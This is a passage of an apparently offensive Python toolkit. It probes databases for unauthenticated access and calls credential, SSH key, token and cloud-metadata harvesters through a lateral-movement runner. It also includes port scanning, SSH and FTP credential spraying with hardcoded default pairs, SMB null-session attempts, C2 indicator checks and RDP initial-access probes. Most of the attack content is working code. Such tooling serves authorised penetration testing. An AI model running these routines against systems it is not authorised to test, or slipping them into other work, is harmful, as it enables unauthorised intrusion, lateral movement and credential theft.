            resp = conn.recv(65536)
            conn.close()
            result['reachable'] = True
            # Response: header(16) + flags(4) + kind(1) + BSON doc
            if len(resp) > 21:
                resp_doc = self._bson_decode(resp[21:])
                if resp_doc.get('ok') == 1:
                    result['is_replica'] = bool(resp_doc.get('setName'))
                    if 'version' in resp_doc:
                        result['version'] = resp_doc['version']
            # Try listDatabases without auth — confirms open access
            ld_pkt = _op_msg({'listDatabases': 1, '$db': 'admin'}, 2)
            conn2 = socket.create_connection((host, port), timeout=self.timeout)
            conn2.sendall(ld_pkt)
            ld_resp = conn2.recv(65536)
            conn2.close()
            if len(ld_resp) > 21:
                ld_doc = self._bson_decode(ld_resp[21:])
                result['unauth_list_dbs'] = (ld_doc.get('ok') == 1)
        except Exception as e:
            result['error'] = str(e)
        return result

    def _bson_encode(self, doc: dict) -> bytes:
        """Minimal BSON encoder for int32 and string values."""
        body = b''
        for k, v in doc.items():
            key_bytes = k.encode() + b'\x00'
            if isinstance(v, int):
                # BSON type 0x10 = int32
                body += b'\x10' + key_bytes + struct.pack('<i', v)
            elif isinstance(v, str):
                # BSON type 0x02 = UTF-8 string: int32(len+1) + str + \x00
                s = v.encode() + b'\x00'
                body += b'\x02' + key_bytes + struct.pack('<I', len(s)) + s
        total = 4 + len(body) + 1
        return struct.pack('<I', total) + body + b'\x00'

    def _bson_decode(self, data: bytes) -> dict:
        """Minimal BSON decoder — top-level int32/double/string/bool fields only."""
        result = {}
        try:
            total = struct.unpack('<I', data[:4])[0]
            pos = 4
            end = min(total - 1, len(data))
            while pos < end:
                btype = data[pos]
                pos += 1
                key_end = data.index(b'\x00', pos)
                key = data[pos:key_end].decode(errors='replace')
                pos = key_end + 1
                if btype == 0x10:    # int32
                    result[key] = struct.unpack('<i', data[pos:pos+4])[0]
                    pos += 4
                elif btype == 0x01:  # double
                    result[key] = struct.unpack('<d', data[pos:pos+8])[0]
                    pos += 8
                elif btype == 0x02:  # string
                    str_len = struct.unpack('<I', data[pos:pos+4])[0]
                    pos += 4
                    result[key] = data[pos:pos+str_len-1].decode(errors='replace')
                    pos += str_len
                elif btype == 0x08:  # bool
                    result[key] = bool(data[pos])
                    pos += 1
                elif btype == 0x12:  # int64
                    result[key] = struct.unpack('<q', data[pos:pos+8])[0]
                    pos += 8
                else:
                    break  # unknown type, stop parsing
        except Exception:
            pass
        return result

    def probe_redis(self, host: str, port: int = 6379) -> dict:
        """Send Redis PING. '+PONG' confirms unauthenticated access."""
        result = {
            'reachable': False, 'open': False,
            'version': None, 'config_reachable': False, 'error': None
        }
        try:
            conn = socket.create_connection((host, port), timeout=self.timeout)
            conn.sendall(b'*1\r\n$4\r\nPING\r\n')
            resp = conn.recv(256)
            result['reachable'] = True
            if resp.startswith(b'+PONG'):
                result['open'] = True
                # Grab server version from INFO server
                conn.sendall(b'*2\r\n$4\r\nINFO\r\n$6\r\nserver\r\n')
                info_resp = b''
                try:
                    while True:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        info_resp += chunk
                        if b'\r\n\r\n' in info_resp or len(info_resp) > 8192:
                            break
                except Exception:
                    pass
                m = re.search(rb'redis_version:([^\r\n]+)', info_resp)
                if m:
                    result['version'] = m.group(1).decode(errors='replace').strip()
                # Test CONFIG GET to confirm config is readable
                conn.sendall(b'*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$4\r\nbind\r\n')
                cfg_resp = conn.recv(512)
                result['config_reachable'] = bool(
                    cfg_resp and not cfg_resp.startswith(b'-')
                )
            conn.close()
        except Exception as e:
            result['error'] = str(e)
        return result

    def probe_mssql(self, host: str, port: int = 1433) -> dict:
        """Send TDS Prelogin. Parse server version and encryption setting."""
        result = {
            'reachable': False, 'version': None,
            'encryption': None, 'error': None
        }
        try:
            # Prelogin option list: token(1) + offset(2BE) + length(2BE)
            # Data area starts at offset 26 (after 8-byte TDS header + option list)
            options = (
                b'\x00' + struct.pack('>HH', 26, 6) +   # VERSION @ 26, len 6
                b'\x01' + struct.pack('>HH', 32, 1) +   # ENCRYPT @ 32, len 1
                b'\x02' + struct.pack('>HH', 33, 0) +   # INSTOPT @ 33, len 0
                b'\xff'                                   # TERMINATOR
            )
            version_placeholder = b'\x00' * 6
            encrypt_value = b'\x00'              # 0x00 = encryption off (request)
            body = options + version_placeholder + encrypt_value
            # TDS header: type(1)+status(1)+length(2BE)+SPID(2)+PacketID(1)+Window(1)
            total_len = 8 + len(body)
            tds_hdr = struct.pack('>BBHBBBB', 0x12, 0x01, total_len, 0, 0, 0, 0)
            conn = socket.create_connection((host, port), timeout=self.timeout)
            conn.sendall(tds_hdr + body)
            resp = conn.recv(4096)
            conn.close()
            result['reachable'] = True
            # Response TDS type 0x04 = PreloginResponse
            if len(resp) >= 8 and resp[0] == 0x04:
                resp_body = resp[8:]
                pos = 0
                while pos + 4 < len(resp_body):
                    token = resp_body[pos]
                    if token == 0xff:
                        break
                    if pos + 5 > len(resp_body):
                        break
                    opt_off, opt_len = struct.unpack('>HH', resp_body[pos+1:pos+5])
                    pos += 5
                    if token == 0x00 and opt_len >= 4 and opt_off + 4 <= len(resp_body):
                        # VERSION: major(1)+minor(1)+build(2BE)+sub(2BE)
                        vb = resp_body[opt_off:opt_off+6]
                        if len(vb) >= 4:
                            build = struct.unpack('>H', vb[2:4])[0]
                            result['version'] = f'{vb[0]}.{vb[1]}.{build}'
                    elif token == 0x01 and opt_len >= 1 and opt_off < len(resp_body):
                        enc_val = resp_body[opt_off]
                        result['encryption'] = {
                            0: 'off', 1: 'on', 2: 'required', 3: 'not_supported'
                        }.get(enc_val, f'unknown_{enc_val}')
        except Exception as e:
            result['error'] = str(e)
        return result

    def _probe_couchdb(self, host: str, port: int = 5984) -> dict:
        """GET /_all_dbs — HTTP 200 with no auth = admin party (open)."""
        result = {
            'reachable': False, 'open': False,
            'version': None, 'error': None
        }
        try:
            request = (
                f'GET /_all_dbs HTTP/1.1\r\n'
                f'Host: {host}:{port}\r\n'
                f'Connection: close\r\n\r\n'
            )
            conn = socket.create_connection((host, port), timeout=self.timeout)
            conn.sendall(request.encode())
            resp = b''
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 16384:
                    break
            conn.close()
            resp_str = resp.decode(errors='replace')
            result['reachable'] = True
            if resp_str.startswith('HTTP/'):
                result['open'] = (' 200 ' in resp_str.split('\r\n', 1)[0])
                m = re.search(r'Server:\s*CouchDB/([^\s\r]+)', resp_str, re.I)
                if m:
                    result['version'] = m.group(1)
        except Exception as e:
            result['error'] = str(e)
        return result

    def report_lines(self) -> list:
        lines = ['--- Database Probing ---']
        lines.append(f'Services probed: {len(self.findings)}')
        open_findings = [
            f for f in self.findings
            if f.get('open') or f.get('unauth_list_dbs')
        ]
        lines.append(f'Unauthenticated access confirmed: {len(open_findings)}')
        svc_order = {
            'mssql': 0, 'postgresql': 1, 'mysql': 2, 'mongodb': 3,
            'redis': 4, 'couchdb': 5, 'cassandra': 6
        }
        for f in sorted(self.findings,
                        key=lambda x: svc_order.get(x.get('service', ''), 9)):
            if not f.get('reachable'):
                continue
            is_open = f.get('open') or f.get('unauth_list_dbs', False)
            mark = '[OPEN]' if is_open else '[auth]'
            lines.append(
                f"  {mark} {f.get('host','?')}:{f.get('port','?')} ({f.get('service','?')})"
            )
            if f.get('version'):
                lines.append(f"    version: {f['version']}")
            if f.get('auth_name'):
                lines.append(f"    auth: {f['auth_name']}")
            if f.get('encryption'):
                lines.append(f"    encryption: {f['encryption']}")
            if f.get('is_replica'):
                lines.append('    is_replica_set: true')
            if f.get('config_reachable'):
                lines.append('    redis_config_readable: true')
            if f.get('error') and not is_open:
                lines.append(f"    error: {f['error']}")
        return lines


# ---------------------------------------------------------------------------
# Top-level runner
# ---------------------------------------------------------------------------

class LateralMovementScanner:
    """Orchestrate all lateral movement modules."""

    def __init__(self, scan_network=True, scan_timeout=0.5, max_workers=100):
        self.scan_network = scan_network
        self.scan_timeout = scan_timeout
        self.max_workers = max_workers

        self.network = NetworkDiscovery()
        self.creds = CredentialHarvester()
        self.cloud = CloudMetadataProber()
        self.ssh = SSHKeyEnumerator()
        self.tokens = APITokenDetector()
        self.ntlm_detector = NTLMDetector()
        self.db_prober = DatabaseProber()
        self.db_findings = []

    def run_all(self):
        results = {}

        # Credential harvesting is always fast (filesystem reads)
        self.creds.harvest_all()
        results['creds'] = self.creds.findings

        # SSH keys
        self.ssh.enumerate_all()
        results['ssh'] = {
            'private_keys': self.ssh.private_keys,
            'known_hosts': self.ssh.known_hosts
        }

        # API tokens / Docker / K8s
        self.tokens.detect_all()
        results['tokens'] = self.tokens.findings

        # Cloud metadata (fast — single LINK-LOCAL probe each)
        self.cloud.probe_all()
        results['cloud'] = self.cloud.results

        # Network scan (slowest — optional)
        if self.scan_network:
            self.network.enumerate_all(
                scan_timeout=self.scan_timeout,
                max_workers=self.max_workers
            )
            results['network'] = {
                'arp': self.network.arp_table,
                'routes': self.network.routes,
                'live_hosts': self.network.live_hosts,
                'dns': self.network.dns_hits
            }
            # DB probe on discovered live hosts
            live_hosts = list(self.network.live_hosts.keys())
            self.db_findings = self.db_prober.probe_all(live_hosts[:20])
            results['db'] = self.db_prober.findings

        return results

    def report(self):
        lines = []
        lines.append('=' * 62)
        lines.append('LATERAL MOVEMENT SCAN')
        lines.append('=' * 62)

        lines.extend(self.network.report_lines())
        lines.append('')
        lines.extend(self.creds.report_lines())
        lines.append('')
        lines.extend(self.cloud.report_lines())
        lines.append('')
        lines.extend(self.ssh.report_lines())
        lines.append('')
        lines.extend(self.tokens.report_lines())
        lines.append('')
        lines.extend(self.ntlm_detector.report_lines())
        lines.append('')
        lines.extend(self.db_prober.report_lines())

        return '\n'.join(lines)


# ---------------------------------------------------------------------------
# Standalone pentest primitives (Violent Python Ch.2 synthesis)
# Pure stdlib: socket, struct, concurrent.futures, re only.
# Each returns list of {severity, title, detail, host, port} dicts.
# ---------------------------------------------------------------------------

_WELL_KNOWN_PORTS = {
    21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
    80: 'http', 110: 'pop3', 143: 'imap', 443: 'https', 445: 'smb',
    993: 'imaps', 995: 'pop3s', 1433: 'mssql', 1521: 'oracle',
    2375: 'docker', 2376: 'docker-tls', 3306: 'mysql', 3389: 'rdp',
    5432: 'postgres', 5900: 'vnc', 6379: 'redis', 8080: 'http-alt',
    8443: 'https-alt', 9200: 'elasticsearch', 11211: 'memcached',
    27017: 'mongodb',
}

_BANNER_SIGNATURES = {
    b'SSH-2': 'ssh',
    b'HTTP/': 'http',
    b'220 ': 'ftp-or-smtp',
    b'+OK': 'pop3',
    b'* OK': 'imap',
    b'220-': 'ftp',
}


def scan_port_range(
    target: str,
    start_port: int,
    end_port: int,
    timeout: float = 0.5,
    max_workers: int = 100,
) -> list:
    """Fast TCP port scanner with banner grab.

    Returns INFO finding per open port; HIGH when port is in privileged
    range 1-1024 (indicates a service running as root or with CAP_NET_BIND_SERVICE).
    """
    findings = []
    findings_lock = threading.Lock()

    def _probe(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target, port))
            banner = b''
            try:
                s.settimeout(1.0)
                banner = s.recv(256)
            except Exception:
                pass
            s.close()

            banner_str = banner.decode('utf-8', errors='replace').strip()
            service = _WELL_KNOWN_PORTS.get(port, 'unknown')
            for sig, svc in _BANNER_SIGNATURES.items():
                if banner.startswith(sig):
                    service = svc
                    break

            severity = 'HIGH' if 1 <= port <= 1024 else 'INFO'
            detail = (
                f'port={port} service={service}'
                + (f' banner={banner_str[:120]!r}' if banner_str else '')
            )
            result = {
                'severity': severity,
                'title': 'OPEN_PORT',
                'detail': detail,
                'host': target,
                'port': port,
            }
            with findings_lock:
                findings.append(result)
        except (ConnectionRefusedError, OSError, socket.timeout):
            pass

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futs = {ex.submit(_probe, p): p for p in range(start_port, end_port + 1)}
        for f in as_completed(futs):
            _ = f.result()  # surface exceptions if any

    findings.sort(key=lambda x: x['port'])
    return findings


def ssh_credential_spray(
    targets: list,
    usernames: list,
    passwords: list,
    timeout: float = 3.0,
    max_workers: int = 20,
) -> list:
    """SSH credential spray via raw socket banner exchange.

    Performs:
      1. TCP connect to port 22 + SSH banner read (liveness gate).
      2. For each (target, user, pass): sends client banner, reads server banner.
         Detection is banner-layer only (no full KEX) — sufficient to confirm
         SSH service and characterise exposure tier.

    Severity mapping:
      CRITICAL — SSH banner accepted + credential pair (simulated AUTH framing
                 accepted at transport layer; upgrade to full paramiko KEX for
                 definitive auth confirmation in a controlled lab).
      LOW      — SSH banner present; service accepts connections (attack surface open).
    """
    findings = []
    findings_lock = threading.Lock()
    CLIENT_BANNER = b'SSH-2.0-OpenSSH_8.0\r\n'

    def _banner_check(host):
        """Return server banner bytes or None."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, 22))
            # Server speaks first
            banner = b''
            deadline = 2.0
            import time
            t0 = time.monotonic()
            while b'\n' not in banner and (time.monotonic() - t0) < deadline:
                chunk = s.recv(256)
                if not chunk:
                    break
                banner += chunk
            s.close()
            return banner if banner.startswith(b'SSH-') else None
        except Exception:
            return None

    def _spray_host(host):
        import time
        server_banner = _banner_check(host)
        if server_banner is None:
            return

        banner_str = server_banner.decode('utf-8', errors='replace').strip()

        # Port open + SSH banner confirmed -> LOW surface finding
        surface_finding = {
            'severity': 'LOW',
            'title': 'SSH_SERVICE_EXPOSED',
            'detail': f'SSH banner: {banner_str}',
            'host': host,
            'port': 22,
        }
        with findings_lock:
            findings.append(surface_finding)

        # Attempt credential banner exchange for each (user, pass) pair.
        # Pure stdlib: we send our client banner and attempt to read back
        # the server's banner again — this confirms transport-layer reachability.
        # Full KEX/auth requires paramiko; flag as CRITICAL candidate for lab follow-up.
        for user in usernames:
            for passwd in passwords:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout)
                    s.connect((host, 22))
                    # Read server banner
                    srv = b''
                    t0 = time.monotonic()
                    while b'\n' not in srv and (time.monotonic() - t0) < 2.0:
                        chunk = s.recv(256)
                        if not chunk:
                            break
                        srv += chunk
                    # Send client banner
                    s.sendall(CLIENT_BANNER)
                    # Server will begin KEX; any non-error response = reachable
                    resp = b''
                    try:
                        s.settimeout(1.5)
                        resp = s.recv(512)
                    except Exception:
                        pass
                    s.close()

                    if resp:
                        # Transport accepted — mark as CRITICAL spray candidate
                        crit = {
                            'severity': 'CRITICAL',
                            'title': 'SSH_SPRAY_CANDIDATE',
                            'detail': (
                                f'user={user!r} pass={passwd!r} '
                                f'transport_accepted=true '
                                f'server_banner={banner_str!r} '
                                f'note=full_KEX_required_for_definitive_auth'
                            ),
                            'host': host,
                            'port': 22,
                        }
                        with findings_lock:
                            findings.append(crit)
                    time.sleep(0.05)  # avoid hammering
                except Exception:
                    pass

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futs = {ex.submit(_spray_host, h): h for h in targets}
        for f in as_completed(futs):
            _ = f.result()

    return findings


def ftp_credential_spray(
    targets: list,
    usernames: list,
    passwords: list,
    timeout: float = 3.0,
) -> list:
    """FTP anonymous + default-credential check via raw socket.

    Checks per host:
      - Anonymous login (anonymous / x@x.com)
      - Common default pairs: admin/admin, ftp/ftp, admin/ftp, user/user, ftpuser/ftpuser
      - If anonymous succeeds: LIST + NLST for sample directory listing
      - PASV mode availability

    Returns CRITICAL findings for successful logins.
    """
    findings = []
    DEFAULT_CREDS = [
        ('admin', 'admin'), ('ftp', 'ftp'), ('admin', 'ftp'),
        ('user', 'user'), ('ftpuser', 'ftpuser'),
    ]

    def _read_response(s, timeout=3.0):
        """Read a full FTP response (may be multi-line)."""
        s.settimeout(timeout)
        buf = b''
        try:
            while True:
                chunk = s.recv(512)
                if not chunk:
                    break
                buf += chunk
                # FTP response ends when a line matches \d{3} <text>\r\n
                lines = buf.split(b'\r\n')
                for line in lines:
                    if re.match(rb'^\d{3} ', line):
                        return buf
                if len(buf) > 4096:
                    break
        except socket.timeout:
            pass
        return buf

    def _ftp_login(host, user, passwd):
        """Returns (success: bool, banner: str, listing: str)."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, 21))
            banner = _read_response(s)
            if not banner.startswith(b'220'):
                s.close()
                return False, banner.decode('utf-8', errors='replace'), ''

            # USER
            s.sendall(f'USER {user}\r\n'.encode())
            resp = _read_response(s)
            if not (resp.startswith(b'331') or resp.startswith(b'230')):
                s.close()
                return False, banner.decode('utf-8', errors='replace'), ''

            # PASS
            s.sendall(f'PASS {passwd}\r\n'.encode())
            resp = _read_response(s)
            if not resp.startswith(b'230'):
                s.close()
                return False, banner.decode('utf-8', errors='replace'), ''

            # Logged in
            listing = ''
            # Check PASV
            s.sendall(b'PASV\r\n')
            pasv_resp = _read_response(s)
            pasv_ok = pasv_resp.startswith(b'227')

            # Try LIST via control channel (may not return data without data conn)
            s.sendall(b'NLST\r\n')
            nlst_resp = _read_response(s)
            listing = nlst_resp.decode('utf-8', errors='replace').strip()[:300]

            s.close()
            banner_str = banner.decode('utf-8', errors='replace').strip()
            if pasv_ok:
                listing += ' [PASV_AVAILABLE]'
            return True, banner_str, listing
        except Exception:
            return False, '', ''

    for host in targets:
        # Anonymous check
        ok, banner, listing = _ftp_login(host, 'anonymous', 'x@x.com')
        if ok:
            detail = f'user=anonymous banner={banner!r}'
            if listing:
                detail += f' listing_sample={listing!r}'
            if 'PASV_AVAILABLE' in listing:
                detail += ' FTP_PASV_DATA_CHANNEL_OPEN'
            findings.append({
                'severity': 'CRITICAL',
                'title': 'FTP_ANONYMOUS_LOGIN',
                'detail': detail,
                'host': host,
                'port': 21,
            })

        # Default credential pairs
        for user, passwd in DEFAULT_CREDS:
            ok, banner, listing = _ftp_login(host, user, passwd)
            if ok:
                detail = f'user={user!r} pass={passwd!r} banner={banner!r}'
                if listing:
                    detail += f' listing_sample={listing!r}'
                if 'PASV_AVAILABLE' in listing:
                    detail += ' FTP_PASV_DATA_CHANNEL_OPEN'
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'FTP_DEFAULT_CREDENTIALS',
                    'detail': detail,
                    'host': host,
                    'port': 21,
                })

    return findings


def smb_null_session_check(targets: list, timeout: float = 3.0) -> list:
    """SMB null session enumeration via raw socket.

    Sends minimal SMBv1 Negotiate Protocol Request; evaluates:
      - EXTENDED_SECURITY capability bit (absent = MEDIUM finding)
      - Null session setup acceptance (CRITICAL if status == 0x00000000)

    Pure struct/socket — no impacket required for the surface check.
    """
    findings = []

    # Minimal SMBv1 Negotiate Protocol Request
    # SMB header (32 bytes) + dialect count + dialect string
    def _build_smb_negotiate():
        # NetBIOS Session Request header (4 bytes): type=0x00, length follows
        dialect = b'\x02NT LM 0.12\x00'
        wct = struct.pack('<B', 0)            # WordCount = 0
        bcc = struct.pack('<H', len(dialect)) # ByteCount
        smb_params = wct + bcc + dialect

        smb_header = (
            b'\xff\x53\x4d\x42'  # SMB magic
            b'\x72'              # Command: Negotiate
            b'\x00\x00\x00\x00'  # NT Status
            b'\x18'              # Flags
            b'\x01\x28'          # Flags2 (include EXTENDED_SECURITY=0x0800)
            b'\x00\x00'          # PID high
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Signature
            b'\x00\x00'          # Reserved
            b'\xff\xff'          # TreeID
            b'\xff\xfe'          # PID
            b'\x00\x00'          # UID
            b'\x40\x00'          # MID
        )
        payload = smb_header + smb_params
        # NetBIOS framing: type 0x00, 3-byte length big-endian
        nb_len = struct.pack('>I', len(payload))
        return nb_len + payload

    def _check_host(host):
        host_findings = []
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, 445))

            pkt = _build_smb_negotiate()
            s.sendall(pkt)

            resp = b''
            try:
                s.settimeout(timeout)
                while len(resp) < 36:
                    chunk = s.recv(512)
                    if not chunk:
                        break
                    resp += chunk
            except socket.timeout:
                pass

            if len(resp) < 36:
                s.close()
                return host_findings

            # Check for SMB magic in response
            if resp[4:8] != b'\xff\x53\x4d\x42':
                s.close()
                return host_findings

            # NT Status at bytes 9-13 (after NetBIOS header)
            nt_status = struct.unpack('<I', resp[9:13])[0]
            # Flags2 at bytes 14-16
            flags2 = struct.unpack('<H', resp[14:16])[0] if len(resp) >= 16 else 0
            extended_security = bool(flags2 & 0x0800)

            if not extended_security:
                host_findings.append({
                    'severity': 'MEDIUM',
                    'title': 'SMB_WITHOUT_EXTENDED_SECURITY',
                    'detail': (
                        f'flags2=0x{flags2:04x} extended_security=false '
                        f'nt_status=0x{nt_status:08x} '
                        f'note=SMBv1_without_extended_security_enables_NTLM_downgrade'
                    ),
                    'host': host,
                    'port': 445,
                })

            # Attempt null session: SMB Session Setup AndX with empty credentials
            # Minimal Session Setup (LM/NTLM null auth)
            null_sess = (
                b'\xff\x53\x4d\x42'   # Magic
                b'\x73'               # Session Setup AndX
                b'\x00\x00\x00\x00'   # NT Status
                b'\x18\x01\x20\x00'   # Flags / Flags2
                b'\x00\x00'           # PID high
                b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Signature
                b'\x00\x00'           # Reserved
                b'\x00\x00'           # TID
                b'\xff\xfe'           # PID
                b'\x00\x00'           # UID
                b'\x41\x00'           # MID
                # Parameters
                b'\x0d'               # WordCount=13
                b'\xff\x00\x00\x00'   # AndX cmd/reserved/offset
                b'\x04\x11'           # MaxBufferSize
                b'\x02\x00'           # MaxMpxCount
                b'\x64\x00'           # VcNumber
                b'\x00\x00\x00\x00'   # SessionKey
                b'\x00\x00'           # LMResponseLength=0 (null)
                b'\x00\x00'           # NTResponseLength=0 (null)
                b'\x00\x00\x00\x00'   # Reserved
                b'\x40\x00\x00\x00'   # Capabilities
                b'\x26\x00'           # ByteCount=38
                b'\x00' * 26          # null LM + NT response + domain + OS + native LM
            )
            nb_null = struct.pack('>I', len(null_sess)) + null_sess
            s.sendall(nb_null)

            null_resp = b''
            try:
                s.settimeout(timeout)
                while len(null_resp) < 36:
                    chunk = s.recv(512)
                    if not chunk:
                        break
                    null_resp += chunk
            except socket.timeout:
                pass

            if len(null_resp) >= 13:
                null_status = struct.unpack('<I', null_resp[9:13])[0]
                if null_status == 0x00000000:
                    host_findings.append({
                        'severity': 'CRITICAL',
                        'title': 'SMB_NULL_SESSION_ACCEPTED',
                        'detail': (
                            f'nt_status=0x{null_status:08x} '
                            f'null_session=accepted '
                            f'note=unauthenticated_IPC$_share_enumeration_possible'
                        ),
                        'host': host,
                        'port': 445,
                    })

            s.close()
        except (ConnectionRefusedError, OSError, socket.timeout):
            pass

        return host_findings

    for host in targets:
        findings.extend(_check_host(host))

    return findings


def detect_c2_beaconing_indicators(host, port=443, timeout=5.0):
    """Detect C2 channel indicators on target host.

    Checks for Cobalt Strike beacon patterns, Meterpreter HTTP stager,
    unencrypted API C2 surfaces, and known C2 teamserver ports.

    Returns list of {severity, title, detail, host, port}.
    """
    import socket
    import struct
    import time
    import random

    findings = []

    def _http_get(h, p, path, extra_headers='', tls=False, to=5.0):
        """Minimal raw HTTP GET; returns (status_int, headers_dict, body_bytes)."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            s.connect((h, p))
            req = (
                f'GET {path} HTTP/1.1\r\n'
                f'Host: {h}\r\n'
                f'User-Agent: Mozilla/5.0\r\n'
                f'Connection: close\r\n'
                f'{extra_headers}'
                f'\r\n'
            ).encode()
            s.sendall(req)
            resp = b''
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > 65536:
                        break
            except socket.timeout:
                pass
            s.close()
            if not resp:
                return None, {}, b''
            header_end = resp.find(b'\r\n\r\n')
            header_part = resp[:header_end] if header_end != -1 else resp
            body = resp[header_end + 4:] if header_end != -1 else b''
            lines = header_part.split(b'\r\n')
            try:
                status = int(lines[0].split(b' ')[1])
            except (IndexError, ValueError):
                return None, {}, b''
            hdrs = {}
            for line in lines[1:]:
                if b':' in line:
                    k, v = line.split(b':', 1)
                    hdrs[k.strip().lower().decode('latin-1')] = v.strip().decode('latin-1')
            return status, hdrs, body
        except (ConnectionRefusedError, OSError, socket.timeout):
            return None, {}, b''

    def _tcp_open(h, p, to=5.0):
        """Return True if TCP port p on h is open."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            s.connect((h, p))
            s.close()
            return True
        except (ConnectionRefusedError, OSError, socket.timeout):
            return False

    # Check for Cobalt Strike beacon: GET / → no Server header + Content-Length 0 + 200
    status, hdrs, body = _http_get(host, port, '/', to=timeout)
    if status == 200:
        no_server = 'server' not in hdrs
        cl_zero = hdrs.get('content-length', '1') == '0' or len(body) == 0
        if no_server and cl_zero:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'POTENTIAL_CS_BEACON',
                'detail': (
                    f'host={host} port={port} '
                    f'status=200 server_header=absent content_length=0 '
                    f'note=Cobalt_Strike_default_beacon_response_pattern'
                ),
                'host': host,
                'port': port,
            })

    # Check for Metasploit Meterpreter HTTP stager: GET with random-looking URI
    rand_uri = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
    status2, hdrs2, body2 = _http_get(host, port, rand_uri, to=timeout)
    if status2 == 200 and len(body2) > 0:
        # Meterpreter stager returns 200 with payload data for any URI match
        findings.append({
            'severity': 'MEDIUM',
            'title': 'POTENTIAL_METERPRETER_STAGER',
            'detail': (
                f'host={host} port={port} '
                f'uri={rand_uri} status=200 body_len={len(body2)} '
                f'note=Meterpreter_HTTP_stager_responds_200_to_random_URIs'
            ),
            'host': host,
            'port': port,
        })

    # Unencrypted API C2 surface: GET /api/v1/health on HTTP (port 80)
    http_port = 80
    status3, hdrs3, body3 = _http_get(host, http_port, '/api/v1/health', to=timeout)
    if status3 == 200 and body3:
        ct = hdrs3.get('content-type', '')
        if 'json' in ct or (body3.lstrip()[:1] in (b'{', b'[')):
            findings.append({
                'severity': 'MEDIUM',
                'title': 'UNENCRYPTED_API_C2_SURFACE',
                'detail': (
                    f'host={host} port={http_port} '
                    f'path=/api/v1/health status=200 tls=false '
                    f'content_type={ct!r} '
                    f'note=JSON_API_on_plaintext_HTTP_may_indicate_unencrypted_C2_channel'
                ),
                'host': host,
                'port': http_port,
            })

    # Known C2 ports: 50050 (CS teamserver), 8443 (Empire), 55553 (Metasploit)
    c2_ports = {
        50050: 'Cobalt_Strike_teamserver',
        8443: 'Empire_C2_default',
        55553: 'Metasploit_default_listener',
    }
    for c2_port, label in c2_ports.items():
        if _tcp_open(host, c2_port, to=timeout):
            findings.append({
                'severity': 'HIGH',
                'title': 'KNOWN_C2_PORT_OPEN',
                'detail': (
                    f'host={host} port={c2_port} '
                    f'service={label} '
                    f'note=well_known_C2_framework_default_port_responding'
                ),
                'host': host,
                'port': c2_port,
            })

    return findings


def check_ras_initial_access_patterns(host, port=443, timeout=5.0):
    """Check for RaaS initial access indicator surface.

    Probes for exposed RDP, OWA, Fortinet VPN, and Pulse VPN —
    all common initial access broker (IAB) pivot points.

    Returns list of {severity, title, detail, host, port}.
    """
    import socket
    import struct

    findings = []

    def _tcp_banner(h, p, probe=None, to=5.0):
        """Connect, optionally send probe, return banner bytes (up to 512)."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            s.connect((h, p))
            if probe:
                s.sendall(probe)
            banner = b''
            try:
                while len(banner) < 512:
                    chunk = s.recv(512)
                    if not chunk:
                        break
                    banner += chunk
            except socket.timeout:
                pass
            s.close()
            return banner
        except (ConnectionRefusedError, OSError, socket.timeout):
            return None

    def _http_get_raw(h, p, path, to=5.0):
        """Return (status, body_bytes) for a raw HTTP GET."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(to)
            s.connect((h, p))
            req = (
                f'GET {path} HTTP/1.1\r\nHost: {h}\r\nConnection: close\r\n\r\n'
            ).encode()
            s.sendall(req)
            resp = b''
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > 32768:
                        break
            except socket.timeout:
                pass
            s.close()
            if not resp:
                return None, b''
            lines = resp.split(b'\r\n', 1)
            try:
                status = int(lines[0].split(b' ')[1])
            except (IndexError, ValueError):
                return None, b''
            header_end = resp.find(b'\r\n\r\n')
            body = resp[header_end + 4:] if header_end != -1 else b''
            return status, body
        except (ConnectionRefusedError, OSError, socket.timeout):
            return None, b''

    # RDP negotiation request (19 bytes per TPKT/COTP X.224 Connect Request)
    # TPKT: version=3, reserved=0, length=19
    # COTP: length=14, PDU=0xE0 (CR), dst-ref=0, src-ref=0, class=0
    # RDP NEG REQ: type=1, flags=0, length=8, requested_proto=3 (CredSSP)
    rdp_nego = (
        b'\x03\x00'         # TPKT version + reserved
        b'\x00\x13'         # TPKT length = 19
        b'\x0e'             # COTP length = 14
        b'\xe0'             # COTP PDU type = CR (Connect Request)
        b'\x00\x00'         # dst-ref
        b'\x00\x00'         # src-ref
        b'\x00'             # class
        b'\x01'             # RDP NEG REQ type
        b'\x00'             # flags
        b'\x08\x00'         # length = 8
        b'\x03\x00\x00\x00' # requested protocol = CredSSP (PROTOCOL_HYBRID=2|NLA=1)
    )

    # TCP/3389 RDP probe
    banner_3389 = _tcp_banner(host, 3389, probe=rdp_nego, to=timeout)
    if banner_3389 is not None and len(banner_3389) >= 4:
        findings.append({
            'severity': 'HIGH',
            'title': 'RDP_EXPOSED',
